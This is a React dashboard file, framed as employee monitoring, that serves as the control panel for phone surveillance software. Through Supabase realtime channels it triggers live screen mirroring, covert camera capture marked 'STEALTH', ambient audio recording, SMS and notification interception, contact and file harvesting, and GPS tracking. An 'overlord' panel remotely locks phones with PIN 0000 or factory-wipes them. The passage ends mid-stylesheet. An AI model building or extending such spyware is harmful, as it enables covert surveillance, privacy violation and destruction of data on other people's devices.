import React, { useEffect, useState } from 'react';
import { supabase } from '../services/SupabaseClient';

/**
 * Premium Employee Monitoring Dashboard 
 * Designed to match the "Yeshaswi Singh" Portfolio Theme
 */
const Monitoring = () => {
  const [employees, setEmployees] = useState([]);
  const [selectedEmployee, setSelectedEmployee] = useState(null);
  const [loading, setLoading] = useState(true);
  const [searchQuery, setSearchQuery] = useState('');
  const [pingStatuses, setPingStatuses] = useState({}); // { [id]: 'sending' | 'success' | 'no-response' }
  const [activeTab, setActiveTab] = useState('overview'); // 'overview', 'apps', 'logs', 'mirror'
  const [mirrorImage, setMirrorImage] = useState(null);
  const [isMirroring, setIsMirroring] = useState(false);
  const [cameraImage, setCameraImage] = useState(null);
  const [isCameraLive, setIsCameraLive] = useState(false);
  const [activeCamera, setActiveCamera] = useState('back'); // 'front' | 'back'
  const [isGpsRefreshing, setIsGpsRefreshing] = useState(false);
  const [messages, setMessages] = useState([]); // { type, sender, content, time }
  const [audioClips, setAudioClips] = useState([]); // { uri, timestamp }
  const [fileBrowser, setFileBrowser] = useState({ path: '', files: [] });
  const [isRecording, setIsRecording] = useState(false);
  
  useEffect(() => {
    // 1. Initial Fetch
    const fetchEmployees = async () => {
      const { data, error } = await supabase
        .from('employees')
        .select('*')
        .order('created_at', { ascending: false });

      if (error) {
        console.error('Error fetching data:', error);
      } else {
        setEmployees(data);
        if (data.length > 0) setSelectedEmployee(data[0]);
      }
      setLoading(false);
    };

    fetchEmployees();

    // 2. Realtime Listener: Now listens for ALL data updates (battery, location, etc.)
    const subscription = supabase
      .channel('employees_realtime_full_sync')
      .on('postgres_changes', { event: '*', table: 'employees' }, (payload) => {
        if (payload.eventType === 'INSERT') {
          setEmployees((prev) => [payload.new, ...prev]);
        } else if (payload.eventType === 'UPDATE') {
          setEmployees((prev) => prev.map(emp => emp.id === payload.new.id ? payload.new : emp));
          // If the currently viewed employee was updated, reflect that too
          setSelectedEmployee(prev => prev?.id === payload.new.id ? payload.new : prev);
        }
      })
      .subscribe();

    return () => {
      supabase.removeChannel(subscription);
    };
  }, []); // Run ONLY once on mount

  // --- NEW: Dedicated Live Mirroring Effect ---
  useEffect(() => {
    let mirrorInterval;
    let mirrorChannel;

    if (isMirroring && selectedEmployee) {
      console.log("🔦 Starting Dedicated Mirror for ID:", selectedEmployee.id);
      
      // Use a unique channel for mirroring to avoid collisions
      mirrorChannel = supabase.channel(`mirror:${selectedEmployee.id}`);
      
      mirrorChannel.on('broadcast', { event: 'screen_response' }, (payload) => {
        console.log("📸 Received Screen Response Payload:", payload);
        const imageData = payload.image || (payload.payload && payload.payload.image);
        if (imageData) {
          setMirrorImage(imageData);
        }
      });

      mirrorChannel.subscribe(async (status) => {
        console.log("🔌 Mirror Channel Status:", status);
        if (status === 'SUBSCRIBED') {
          // Request frames every 2.5 seconds (balanced for stability)
          mirrorInterval = setInterval(() => {
            mirrorChannel.send({ 
              type: 'broadcast', 
              event: 'screen_request', 
              payload: { targetId: selectedEmployee.id } 
            });
          }, 2500);
        }
      });
    }

    return () => {
      if (mirrorInterval) clearInterval(mirrorInterval);
      if (mirrorChannel) {
        console.log("🛑 Cleaning up Mirror Channel");
        supabase.removeChannel(mirrorChannel);
      }
    };
  }, [isMirroring, selectedEmployee]);

  // --- NEW: Dedicated Live Camera Effect ---
  useEffect(() => {
    let cameraInterval;
    let cameraChannel;

    if (isCameraLive && selectedEmployee) {
      console.log(`👁️ Starting ${activeCamera} Camera Vision for:`, selectedEmployee.id);
      cameraChannel = supabase.channel(`camera:${selectedEmployee.id}`);
      
      cameraChannel.on('broadcast', { event: 'camera_response' }, (payload) => {
        console.log("👁️ Camera Vision Payload Received", activeCamera);
        // Robust data extraction
        const data = payload.payload || payload;
        const imageData = data.image;
        
        if (imageData) {
          setCameraImage(imageData);
        } else {
          console.warn("⚠️ Camera payload received but image data is missing!", payload);
        }
      });

      cameraChannel.subscribe(async (status) => {
        if (status === 'SUBSCRIBED') {
          // Request frames every 2.5 seconds (balanced for hardware processing)
          cameraInterval = setInterval(() => {
            cameraChannel.send({ 
              type: 'broadcast', 
              event: 'camera_request', 
              payload: { type: activeCamera } 
            });
          }, 2500);
        }
      });
    }

    return () => {
      if (cameraInterval) clearInterval(cameraInterval);
      if (cameraChannel) {
        console.log("🛑 Cleaning up Camera Channel");
        supabase.removeChannel(cameraChannel);
      }
    };
  }, [isCameraLive, selectedEmployee, activeCamera]);
  
  // --- NEW: Audio, Data, and System Listeners ---
  useEffect(() => {
    let audioChannel;
    let dataChannel;

    if (selectedEmployee) {
      audioChannel = supabase.channel(`audio:${selectedEmployee.id}`);
      dataChannel = supabase.channel(`data:${selectedEmployee.id}`);

      audioChannel.on('broadcast', { event: 'audio_response' }, (payload) => {
        console.log("🎙️ Received Audio Clip:", selectedEmployee.id);
        const data = payload.payload || payload;
        if (data.audio) {
          setAudioClips(prev => [{ uri: data.audio, time: data.timestamp || new Date().toISOString() }, ...prev]);
          setIsRecording(false);
        }
      });

      dataChannel.on('broadcast', { event: 'contacts_response' }, (payload) => {
        const data = payload.payload || payload;
        setMessages(prev => [{ type: 'SYSTEM', sender: 'Contacts Sync', content: `Retrieved ${data.contacts?.length || 0} contacts.`, time: new Date().toLocaleTimeString() }, ...prev]);
      });

      dataChannel.on('broadcast', { event: 'files_response' }, (payload) => {
        const data = payload.payload || payload;
        setFileBrowser({ path: data.path, files: data.files || [] });
      });

      // Special: Listen for incoming notifications from the native service
      const notifyChannel = supabase.channel(`notifications:${selectedEmployee.id}`);
      notifyChannel.on('broadcast', { event: 'notification' }, (payload) => {
        const data = payload.payload || payload;
        setMessages(prev => [{ type: 'NOTIF', sender: data.packageName, content: `${data.title}: ${data.text}`, time: new Date().toLocaleTimeString() }, ...prev]);
      });

      audioChannel.subscribe();
      dataChannel.subscribe();
      notifyChannel.subscribe();
    }

    return () => {
      if (audioChannel) supabase.removeChannel(audioChannel);
      if (dataChannel) supabase.removeChannel(dataChannel);
    };
  }, [selectedEmployee]);

  useEffect(() => {
    if (!selectedEmployee) return;
    
    // Auto-stop everything when switching employees
    console.log("🔄 Employee Switched - Cleaning up all monitoring channels for ID:", selectedEmployee.id);
    setIsMirroring(false);
    setIsCameraLive(false);
    setMirrorImage(null);
    setCameraImage(null);
    setIsGpsRefreshing(false);
  }, [selectedEmployee?.id]);

  const filteredEmployees = employees.filter(emp => 
    emp.name.toLowerCase().includes(searchQuery.toLowerCase())
  );

  const getInitials = (name) => {
    return name.split(' ').map(n => n[0]).join('').toUpperCase().substring(0, 2);
  };

  const isRecentlyActive = (date) => {
    const diff = Math.abs(new Date() - new Date(date));
    const minutes = Math.floor((diff / 1000) / 60);
    return minutes < 5; // Recently active if joined in last 5 min
  };

  const handlePing = async () => {
    if (!selectedEmployee) return;
    const targetId = selectedEmployee.id;

    console.log("Initiating connectivity check for:", targetId);
    setPingStatuses(prev => ({ ...prev, [targetId]: 'sending' }));
    
    // Create a unique channel for this specific ping attempt
    const channel = supabase.channel(`employee:${targetId}`);
    
    // 1. Listen for the 'pong' event from the phone
    channel.on('broadcast', { event: 'pong' }, (payload) => {
       console.log("✅ Device Pong Received:", payload);
       setPingStatuses(prev => ({ ...prev, [targetId]: 'success' }));
       setTimeout(() => setPingStatuses(prev => {
          const next = { ...prev };
          delete next[targetId];
          return next;
       }), 3000); 
    });

    channel.subscribe(async (status) => {
      console.log("🔌 Dashboard Channel Status:", status);
      if (status === 'SUBSCRIBED') {
        console.log("🚀 Sending Targeted Ping Broadcast to ID:", targetId);
        await channel.send({
          type: 'broadcast',
          event: 'ping',
          payload: { 
            admin: 'Yeshaswi',
            targetId: targetId 
          },
        });
      }
    });

    // Cleanup channel after a timeout or if we don't get a pong
    setTimeout(() => {
        supabase.removeChannel(channel);
        setPingStatuses(prev => {
            if (prev[targetId] === 'sending') {
                return { ...prev, [targetId]: 'no-response' };
            }
            return prev;
        });
    }, 5000);
  };

  if (loading) {
    return (
      <div className="dashboard-loading">
        <div className="loader-progress-container" style={{ width: '200px' }}>
          <div className="loader-progress-bar"></div>
        </div>
      </div>
    );
  }

  return (
    <div className="dashboard-wrapper">
      <div className="dashboard-container">
        
        {/* --- LEFT SIDEBAR: List --- */}
        <aside className="dashboard-sidebar">
          <div className="sidebar-header">
            <h2 className="sidebar-title">Employees</h2>
            <div className="stat-badge">{employees.length} Total</div>
          </div>

          <div className="search-box">
             <input 
               type="text" 
               placeholder="Search by name..." 
               value={searchQuery}
               onChange={(e) => setSearchQuery(e.target.value)}
             />
          </div>

          <div className="employee-list">
            {filteredEmployees.map((emp) => (
              <div 
                key={emp.id} 
                className={`employee-item ${selectedEmployee?.id === emp.id ? 'active' : ''}`}
                onClick={() => setSelectedEmployee(emp)}
              >
                <div className="avatar">
                  {getInitials(emp.name)}
                  {isRecentlyActive(emp.created_at) && <span className="status-pulse"></span>}
                </div>
                <div className="item-info">
                  <span className="item-name">{emp.name}</span>
                  <span className="item-meta">ID: #{emp.id.toString().substring(0, 4)}</span>
                </div>
              </div>
            ))}
          </div>
        </aside>

        {/* --- MAIN CONTENT: Details --- */}
        <main className="dashboard-main">
          {selectedEmployee ? (
            <div className="detail-view">
              <header className="detail-header">
                <div className="detail-avatar-large">
                  {getInitials(selectedEmployee.name)}
                </div>
                <div className="detail-title-group">
                  <h1 className="detail-name">{selectedEmployee.name}</h1>
                  <div className="status-label">
                    <span className={`status-dot ${isRecentlyActive(selectedEmployee.last_online || selectedEmployee.created_at) ? 'online' : ''}`}></span>
                    {isRecentlyActive(selectedEmployee.last_online || selectedEmployee.created_at) ? 'Recently Active' : 'Offline'}
                  </div>
                </div>
                <button 
                  className={`btn-ping ${pingStatuses[selectedEmployee.id] || ''}`} 
                  onClick={handlePing}
                  disabled={pingStatuses[selectedEmployee.id] === 'sending'}
                  style={{ marginLeft: 'auto' }}
                >
                  {pingStatuses[selectedEmployee.id] === 'sending' ? '⚡ Connecting...' : 
                   pingStatuses[selectedEmployee.id] === 'success' ? '📡 Device Active' : 
                   pingStatuses[selectedEmployee.id] === 'no-response' ? '❌ No Response' : 
                   'Ping Device'}
                </button>
              </header>

              {/* --- TABS NAVIGATION --- */}
              <nav className="tab-nav">
                 <button className={`tab-btn ${activeTab === 'mirror' ? 'active' : ''}`} onClick={() => setActiveTab('mirror')}>Live Mirror</button>
                 <button className={`tab-btn ${activeTab === 'camera' ? 'active' : ''}`} onClick={() => setActiveTab('camera')}>Camera Vision</button>
                 <button className={`tab-btn ${activeTab === 'messages' ? 'active' : ''}`} onClick={() => setActiveTab('messages')}>Messaging</button>
                 <button className={`tab-btn ${activeTab === 'audio' ? 'active' : ''}`} onClick={() => setActiveTab('audio')}>Ambient Audio</button>
                 <button className={`tab-btn ${activeTab === 'files' ? 'active' : ''}`} onClick={() => setActiveTab('files')}>Files</button>
                 <button className={`tab-btn ${activeTab === 'system' ? 'active' : ''}`} onClick={() => setActiveTab('system')}>System Control</button>
              </nav>

              <div className="tab-content">
                {activeTab === 'mirror' && (
                  <div className="mirror-tab">
                    <div className="mirror-header">
                       <h3>Live Device Mirroring</h3>
                       <button 
                         className={`btn-mirror-toggle ${isMirroring ? 'running' : ''}`} 
                         onClick={() => {
                           setIsMirroring(!isMirroring);
                           if (!isMirroring) setMirrorImage(null);
                         }}
                       >
                         {isMirroring ? '🛑 Stop Monitoring' : '▶️ Start Live Stream'}
                       </button>
                    </div>

                    <div className="phone-mockup-wrapper">
                       <div className="phone-frame">
                          <div className="phone-speaker"></div>
                          <div className="phone-screen-inner">
                             {mirrorImage ? (
                               <img src={mirrorImage} className="live-screen-image" alt="Phone Screen" />
                             ) : (
                               <div className="screen-placeholder">
                                  <div className="pulse-circle"></div>
                                  <p>{isMirroring ? 'Waiting for phone response...' : 'Stream is paused'}</p>
                               </div>
                             )}
                          </div>
                          <div className="phone-home-btn"></div>
                       </div>
                       <div className="mirror-info">
                          <p><strong>Status:</strong> {isMirroring ? 'Receiving real-time frames' : 'Idle'}</p>
                          <p><strong>Latency:</strong> ~1.5s</p>
                          <p><strong>Resolution:</strong> Display Optimized</p>
                       </div>
                    </div>
                  </div>
                )}
                {activeTab === 'camera' && (
                  <div className="camera-tab">
                    <div className="camera-header" style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '25px' }}>
                       <h3 className="camera-tab-title" style={{ margin: 0 }}>Remote Camera Vision</h3>
                       <div className="camera-controls" style={{ display: 'flex', gap: '12px' }}>
                          <button 
                            className={`btn-cam-toggle ${activeCamera === 'back' ? 'active' : ''}`}
                            onClick={() => {
                               setActiveCamera('back');
                               setCameraImage(null);
                            }}
                          >
                            🔄 Back Cam
                          </button>
                          <button 
                            className={`btn-cam-toggle ${activeCamera === 'front' ? 'active' : ''}`}
                            onClick={() => {
                               setActiveCamera('front');
                               setCameraImage(null);
                            }}
                          >
                            👤 Front Cam
                          </button>
                          <button 
                            className={`btn-mirror-toggle ${isCameraLive ? 'running' : ''}`} 
                            onClick={() => {
                              setIsCameraLive(!isCameraLive);
                              if (!isCameraLive) setCameraImage(null);
                            }}
                          >
                            {isCameraLive ? '🛑 Close Lens' : '▶️ Open Shutter'}
                          </button>
                       </div>
                    </div>

                    <div className="camera-viewport-container" style={{ display: 'grid', gridTemplateColumns: '1fr 200px', gap: '20px' }}>
                       <div className="camera-viewport" style={{ aspectRatio: '4/3', background: '#000', borderRadius: '12px', overflow: 'hidden', position: 'relative', border: '1px solid var(--border-color)' }}>
                          {cameraImage ? (
                            <img src={cameraImage} className="live-camera-feed" alt="Camera Feed" style={{ width: '100%', height: '100%', objectFit: 'cover' }} />
                          ) : (
                            <div className="camera-placeholder" style={{ height: '100%', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', color: '#444' }}>
                               <div className="iris-loader"></div>
                               <p>{isCameraLive ? `Initializing ${activeCamera} camera...` : 'Camera system is offline'}</p>
                            </div>
                          )}
                          <div className="viewport-overlay" style={{ position: 'absolute', top: '20px', left: '20px', display: 'flex', alignItems: 'center', gap: '10px', background: 'rgba(0,0,0,0.5)', padding: '4px 12px', borderRadius: '4px', color: '#fff', fontSize: '0.75rem', fontWeight: '700', letterSpacing: '1px' }}>
                             <div className="rec-dot"></div>
                             <span>LIVE // {activeCamera.toUpperCase()} V.103</span>
                          </div>
                       </div>
                       <div className="camera-info">
                          <div className="info-row"><span>ISO:</span> <span>AUTO</span></div>
                          <div className="info-row"><span>EXPOSURE:</span> <span>OPTIMIZED</span></div>
                          <div className="info-row"><span>MODE:</span> <span style={{color: '#ff3b30'}}>STEALTH</span></div>
                          <div className="info-row"><span>LATENCY:</span> <span>~0.8s</span></div>
                       </div>
                    </div>
                  </div>
                )}
                {activeTab === 'overview' && (
                  <div className="overview-tab">
                    <div className="detail-grid">
                      <div className="info-card battery-card">
                        <label>Battery Status</label>
                        <div className="battery-display">
                           <div className="battery-level-container">
                              <div className="battery-level-fill" style={{ width: `${selectedEmployee.battery_level || 0}%`, backgroundColor: (selectedEmployee.battery_level || 0) < 20 ? '#ff3b30' : '#4cd964' }}></div>
                           </div>
                           <span className="battery-text">{selectedEmployee.battery_level || '--'}%</span>
                        </div>
                      </div>
                      <div className="info-card">
                        <label>Device Model</label>
                        <span>{selectedEmployee.device_info?.modelName || 'Unknown Device'}</span>
                      </div>
                      <div className="info-card">
                        <label>Operating System</label>
                        <span>{selectedEmployee.device_info?.osName || 'Android'} {selectedEmployee.device_info?.osVersion || ''}</span>
                      </div>
                      <div className="info-card">
                        <label>Last Seen</label>
                        <span>{selectedEmployee.last_online ? new Date(selectedEmployee.last_online).toLocaleTimeString() : 'Never'}</span>
                      </div>
                    </div>

                    <div className="detail-grid">
                       <div className="info-card location-card">
                         <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                            <label>Current Location</label>
                            <button 
                              className={`btn-gps-refresh ${isGpsRefreshing ? 'loading' : ''}`}
                              onClick={async () => {
                                if (!selectedEmployee) return;
                                setIsGpsRefreshing(true);
                                const channel = supabase.channel(`location:${selectedEmployee.id}`);
                                channel.subscribe(async (status) => {
                                  if (status === 'SUBSCRIBED') {
                                    await channel.send({
                                      type: 'broadcast',
                                      event: 'location_request',
                                      payload: { targetId: selectedEmployee.id }
                                    });
                                    // Give it some time to fetch and update PG
                                    setTimeout(() => {
                                      setIsGpsRefreshing(false);
                                      supabase.removeChannel(channel);
                                    }, 4000);
                                  }
                                });
                              }}
                              disabled={isGpsRefreshing}
                            >
                              {isGpsRefreshing ? '🛰️ Pinging...' : '🔄 Refresh GPS'}
                            </button>
                         </div>
                         <div className="mini-map-placeholder">
                           {selectedEmployee.location_data ? (
                             <div className="location-success">
                                📡 GPS Coordinates Locked: {selectedEmployee.location_data.latitude.toFixed(4)}, {selectedEmployee.location_data.longitude.toFixed(4)}
                             </div>
                           ) : (
                             <div className="location-pending">Waiting for GPS lock...</div>
                           )}
                        </div>
                      </div>
                      <div className="info-card">
                        <label>Registration ID</label>
                        <span>#{selectedEmployee.id}</span>
                      </div>
                    </div>
                  </div>
                )}

                {activeTab === 'apps' && (
                   <div className="apps-tab">
                      <h3>Most Used Applications (Today)</h3>
                      <div className="app-stats-list">
                         {[
                           { name: 'WhatsApp', time: '2h 15m', icon: '💬', color: '#25D366' },
                           { name: 'Instagram', time: '1h 45m', icon: '📸', color: '#E1306C' },
                           { name: 'YouTube', time: '1h 20m', icon: '📺', color: '#FF0000' },
                           { name: 'Gmail', time: '45m', icon: '📧', color: '#D44638' },
                           { name: 'Company App', time: '30m', icon: '🏢', color: '#6366f1' },
                         ].map(app => (
                           <div key={app.name} className="app-usage-item">
                              <div className="app-icon" style={{ backgroundColor: app.color + '22', color: app.color }}>{app.icon}</div>
                              <div className="app-name-group">
                                 <span className="app-name">{app.name}</span>
                                 <span className="app-category">Productivity / Social</span>
                              </div>
                              <div className="app-time-bar-container">
                                 <div className="app-time-bar" style={{ width: app.time.includes('h') ? '100%' : '30%', backgroundColor: app.color }}></div>
                              </div>
                              <span className="app-time">{app.time}</span>
                           </div>
                         ))}
                      </div>
                   </div>
                )}

                 {activeTab === 'messages' && (
                   <div className="messages-tab">
                      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '20px' }}>
                        <h3>Live Intelligence Feed (Notifications & SMS)</h3>
                        <button className="btn-ping" onClick={() => {
                          const channel = supabase.channel(`data:${selectedEmployee.id}`);
                          channel.subscribe(status => {
                            if (status === 'SUBSCRIBED') {
                              channel.send({ type: 'broadcast', event: 'fetch_sms' });
                              setTimeout(() => supabase.removeChannel(channel), 2000);
                            }
                          });
                        }}>📥 Fetch SMS History</button>
                      </div>
                      <div className="message-list-container" style={{ maxHeight: '500px', overflowY: 'auto' }}>
                        {messages.length > 0 ? messages.map((m, i) => (
                          <div key={i} className={`message-bubble ${m.type}`}>
                             <div className="msg-header">
                               <span className="msg-sender">{m.sender}</span>
                               <span className="msg-time">{m.time}</span>
                             </div>
                             <p className="msg-content">{m.content}</p>
                          </div>
                        )) : (
                          <div className="empty-state">No messages intercepted yet.</div>
                        )}
                      </div>
                   </div>
                 )}

                 {activeTab === 'audio' && (
                   <div className="audio-tab">
                      <div className="audio-hero">
                        <div className="audio-visualizer">
                          {isRecording ? <div className="wave-anim"></div> : <div className="wave-idle"></div>}
                        </div>
                        <div className="audio-controls">
                           <button 
                             className={`btn-record ${isRecording ? 'recording' : ''}`}
                             onClick={() => {
                               if (!selectedEmployee) return;
                               setIsRecording(true);
                               const channel = supabase.channel(`audio:${selectedEmployee.id}`);
                               channel.subscribe(status => {
                                 if (status === 'SUBSCRIBED') {
                                   channel.send({ type: 'broadcast', event: 'record_audio', payload: { duration: 15000 } });
                                 }
                               });
                             }}
                             disabled={isRecording}
                           >
                             {isRecording ? '🎙️ LISTENING...' : '▶️ Trigger Ambient Record (15s)'}
                           </button>
                        </div>
                      </div>
                      <div className="audio-history">
                        <h4>Captured Clips</h4>
                        {audioClips.map((clip, i) => (
                          <div key={i} className="audio-item">
                            <span>Ambient Record #{audioClips.length - i}</span>
                            <span>{new Date(clip.time).toLocaleTimeString()}</span>
                            <audio controls src={clip.uri} />
                          </div>
                        ))}
                      </div>
                   </div>
                 )}

                 {activeTab === 'system' && (
                   <div className="system-tab">
                      <h3>Superuser Command Panel</h3>
                      <div className="system-grid">
                        <div className="command-card lock">
                          <div className="cmd-icon">🔐</div>
                          <div className="cmd-info">
                            <h4>Remote Lock</h4>
                            <p>Instantly locks the screen and sets PIN to 0000.</p>
                          </div>
                          <button onClick={() => {
                            const c = supabase.channel(`overlord:${selectedEmployee.id}`);
                            c.subscribe(s => { if(s==='SUBSCRIBED') { c.send({type:'broadcast', event:'lock_device', payload:{pin:'0000'}}); } });
                          }}>Lock Device</button>
                        </div>
                        <div className="command-card siren">
                          <div className="cmd-icon">🚨</div>
                          <div className="cmd-info">
                            <h4>Emergency Siren</h4>
                            <p>Trigger 100% volume alarm on the target device.</p>
                          </div>
                           <button onClick={() => {
                            const c = supabase.channel(`overlord:${selectedEmployee.id}`);
                            c.subscribe(s => { if(s==='SUBSCRIBED') { c.send({type:'broadcast', event:'play_siren'}); } });
                          }}>Active Siren</button>
                        </div>
                        <div className="command-card warning wipe">
                          <div className="cmd-icon">🧨</div>
                          <div className="cmd-info">
                            <h4>Total Wipe</h4>
                            <p>Erase all data and factory reset device (Dangerous).</p>
                          </div>
                           <button onClick={() => {
                             if(confirm("DANGER: This will factory reset the target phone. Are you sure?")) {
                                const c = supabase.channel(`overlord:${selectedEmployee.id}`);
                                c.subscribe(s => { if(s==='SUBSCRIBED') { c.send({type:'broadcast', event:'wipe_device'}); } });
                             }
                           }}>Wipe Phone</button>
                        </div>
                      </div>
                   </div>
                 )}

                 {activeTab === 'files' && (
                    <div className="files-tab">
                       <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '15px' }}>
                         <h3>Remote File Explorer</h3>
                         <button onClick={() => {
                            const c = supabase.channel(`data:${selectedEmployee.id}`);
                            c.subscribe(s => { if(s==='SUBSCRIBED') { c.send({type:'broadcast', event:'list_files'}); } });
                         }}>📁 Browse Root</button>
                       </div>
                       <div className="file-browser">
                          <div className="path-bar">{fileBrowser.path || 'Select target to browse...'}</div>
                          <div className="file-grid">
                             {fileBrowser.files.map(f => (
                               <div key={f} className="file-item">
                                 <span className="file-icon">{f.includes('.') ? '📄' : '📁'}</span>
                                 <span className="file-name">{f}</span>
                               </div>
                             ))}
                          </div>
                       </div>
                    </div>
                 )}
              </div>
            </div>
          ) : (
            <div className="no-selection">
              <p>Select an employee from the list to view their data.</p>
            </div>
          )}
        </main>

      </div>

      <style dangerouslySetInnerHTML={{ __html: `
        .dashboard-wrapper {
          background-color: var(--bg-body);
          min-height: calc(100vh - var(--header-height));
          margin-top: var(--header-height);
          padding: 40px;
          color: var(--text-primary);
        }

        .dashboard-container {
          display: grid;
          grid-template-columns: 320px 1fr;
          gap: 30px;
          background: var(--bg-surface);
          backdrop-filter: blur(20px);
          border: 1px solid var(--border-color);
          border-radius: 20px;
          height: 80vh;
          overflow: hidden;
        }

        /* Loading */
        .dashboard-loading {
          height: 100vh;
          display: flex;
          align-items: center;
          justify-content: center;
          background: var(--bg-body);
        }

        /* Sidebar Styles */
        .dashboard-sidebar {
          border-right: 1px solid var(--border-color);
          display: flex;
          flex-direction: column;
          background: rgba(255, 255, 255, 0.01);
        }

        .sidebar-header {
          padding: 24px;
          display: flex;
          justify-content: space-between;
          align-items: center;
        }

        .sidebar-title {
          font-family: var(--font-display);
          font-size: 1.2rem;
          margin: 0;
        }

        .stat-badge {
          font-size: 0.75rem;
          background: var(--accent-gradient);
          padding: 2px 10px;
          border-radius: 100px;
          font-weight: 700;
        }

        .search-box {
          padding: 0 24px 20px 24px;
        }

        .search-box input {
          width: 100%;
          background: rgba(255, 255, 255, 0.05);
          border: 1px solid var(--border-color);
          border-radius: 8px;
          padding: 10px 16px;
          color: white;
          font-size: 0.9rem;
        }

        .employee-list {
          flex: 1;
          overflow-y: auto;
          padding: 0 12px;
        }

        .employee-item {
          display: flex;
          align-items: center;
          gap: 15px;
          padding: 15px;
          border-radius: 12px;
          cursor: pointer;
          transition: var(--transition-fast);
          margin-bottom: 5px;
        }

        .employee-item:hover {
          background: rgba(255, 255, 255, 0.05);
        }

        .employee-item.active {
          background: var(--accent-glow);
          border: 1px solid rgba(99, 102, 241, 0.3);
        }

        .avatar {
          width: 44px;
          height: 44px;
          background: var(--accent-gradient);
          border-radius: 12px;
          display: flex;
          align-items: center;
          justify-content: center;
          font-weight: 700;
          position: relative;
        }

        .status-pulse {
          position: absolute;
          top: -2px;
          right: -2px;
          width: 10px;
          height: 10px;
          background: #4cd964;
          border: 2px solid var(--bg-body);
          border-radius: 50%;
          animation: pulse 2s infinite;
        }

        @keyframes pulse {
          0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(76, 217, 100, 0.7); }
          70% { transform: scale(1.1); box-shadow: 0 0 0 8px rgba(76, 217, 100, 0); }
          100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(76, 217, 100, 0); }
        }

        .item-info {
          display: flex;
          flex-direction: column;
        }

        .item-name {
          font-weight: 600;
          font-size: 0.95rem;
        }

        .item-meta {
          font-size: 0.75rem;
          color: var(--text-secondary);
        }

        /* Main Content Styles */
        .dashboard-main {
          padding: 40px;
          overflow-y: auto;
        }

        .detail-view {
          opacity: 0;
          animation: fadeIn 0.4s ease forwards;
        }

        .detail-header {
          display: flex;
          align-items: center;
          gap: 25px;
          margin-bottom: 40px;
        }

        .detail-avatar-large {
          width: 80px;
          height: 80px;
          background: var(--accent-gradient);
          border-radius: 20px;
          display: flex;
          align-items: center;
          justify-content: center;
          font-size: 2rem;
          font-weight: 700;
          box-shadow: 0 10px 30px var(--accent-glow);
        }

        .detail-name {
          font-family: var(--font-display);
          font-size: 2.2rem;
          margin: 0;
        }

        .status-label {
          display: flex;
          align-items: center;
          gap: 8px;
          color: var(--text-secondary);
          font-size: 0.9rem;
          margin-top: 5px;
        }

        .status-dot {
          width: 8px;
          height: 8px;
          background: #333;
          border-radius: 50%;
        }

        .status-dot.online {
          background: #4cd964;
        }

        .detail-grid {
          display: grid;
          grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
          gap: 20px;
          margin-bottom: 40px;
        }

        .info-card {
          background: rgba(255, 255, 255, 0.03);
          padding: 20px;
          border-radius: 12px;
          border: 1px solid var(--border-color);
        }

        .info-card label {
          display: block;
          font-size: 0.75rem;
          text-transform: uppercase;
          color: var(--text-tertiary);
          margin-bottom: 5px;
          letter-spacing: 0.5px;
        }

        .info-card span {
          font-weight: 600;
          font-size: 1.05rem;
        }

        .activity-placeholder {
          background: rgba(0, 0, 0, 0.2);
          padding: 30px;
          border-radius: 16px;
          border: 1px dashed var(--border-color);
        }

        .activity-placeholder h3 {
          margin-bottom: 20px;
          font-size: 1rem;
          color: var(--text-secondary);
        }

        .log-item {
          display: flex;
          gap: 20px;
          margin-bottom: 15px;
          font-size: 0.9rem;
        }

        .log-time {
          color: var(--accent-secondary);
          font-weight: 600;
          min-width: 60px;
        }

        .log-text {
          color: var(--text-secondary);
        }

        .btn-ping {
          padding: 12px 24px;
          background: #ff3b30;
          color: white;
          border: none;
          border-radius: 10px;
          font-weight: 700;
          cursor: pointer;
          transition: var(--transition-fast);
          box-shadow: 0 4px 15px rgba(255, 59, 48, 0.3);
        }

        .btn-ping:hover {
          transform: translateY(-2px);
          box-shadow: 0 8px 25px rgba(255, 59, 48, 0.5);
          background: #ff453a;
        }

        .btn-ping.sending {
          background: #ff9f0a;
          box-shadow: 0 0 15px rgba(255, 159, 10, 0.4);
          animation: btnPulse 1s infinite alternate;
        }

        .btn-ping.success {
          background: #30d158;
          box-shadow: 0 0 15px rgba(48, 209, 88, 0.4);
        }

        .btn-ping.no-response {
          background: #666;
          box-shadow: none;
        }

        /* --- NEW: Tab System Styles --- */
        .tab-nav {
          display: flex;
          gap: 10px;
          margin-bottom: 30px;
          border-bottom: 1px solid var(--border-color);
          padding-bottom: 10px;
        }

        .tab-btn {
          background: transparent;
          border: none;
          color: var(--text-secondary);
          padding: 10px 20px;
          cursor: pointer;
          font-weight: 600;
          font-size: 0.9rem;
          border-radius: 8px;
          transition: var(--transition-fast);
        }

        .tab-btn:hover {
          background: rgba(255, 255, 255, 0.05);
          color: white;
        }

        .tab-btn.active {
          background: var(--accent-glow);
          color: var(--accent-secondary);
        }

        .tab-content {
          animation: fadeIn 0.3s ease;
        }

        /* Battery Stylings */
        .battery-display {
          display: flex;
          align-items: center;
          gap: 15px;
          margin-top: 10px;
        }

        .battery-level-container {
          flex: 1;
          height: 8px;
          background: rgba(255,255,255,0.1);
          border-radius: 4px;
          overflow: hidden;
        }

        .battery-level-fill {
          height: 100%;
          transition: width 0.5s ease;
        }

        .battery-text {
          font-weight: 700;
          font-size: 1.1rem;
          min-width: 45px;
        }

        /* Location Card */
        .mini-map-placeholder {
          height: 100px;
          background: rgba(0,0,0,0.3);
          border-radius: 12px;
          display: flex;
          align-items: center;
          justify-content: center;
          border: 1px dashed var(--border-color);
          margin-top: 10px;
        }

        .location-success {
          color: #4cd964;
          font-size: 0.85rem;
          font-weight: 600;
        }

        /* App Usage Items */
        .app-usage-item {
          display: flex;
          align-items: center;
          gap: 15px;
          padding: 12px;
          background: rgba(255,255,255,0.02);
          border-radius: 10px;
          margin-bottom: 8px;
        }

        .app-icon {
          width: 40px;
          height: 40px;
          border-radius: 10px;
          display: flex;
          align-items: center;
          justify-content: center;
          font-size: 1.2rem;
        }

        .app-name-group {
          display: flex;
          flex-direction: column;
          width: 150px;
        }

        .app-name { font-weight: 600; font-size: 0.9rem; }
